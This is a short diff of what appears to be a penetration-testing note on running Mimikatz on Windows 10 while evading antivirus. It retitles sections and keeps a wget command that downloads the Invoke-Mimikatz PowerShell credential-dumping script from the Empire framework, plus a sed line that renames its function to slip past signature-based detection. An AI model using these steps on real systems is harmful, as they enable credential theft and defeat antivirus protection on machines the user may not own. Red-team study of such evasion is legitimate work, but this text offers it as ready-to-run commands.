@@ -1,9 +1,8 @@
-# AV Bypass to run Mimikatz
+# Download Mimikatz web with Powershell
+
 mimikatz 2.1.1 (x64) built on Aug  3 2018
 
 OK for Win 10 (v1803)
-
-
 
 Powershell as Administrator
 
@@ -16,7 +15,7 @@ or via web:
 
 
 
-# Script to obfuscate mimikatz
+# Script to obfuscate mimikatz and bypass AV
     
     wget https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1
     sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
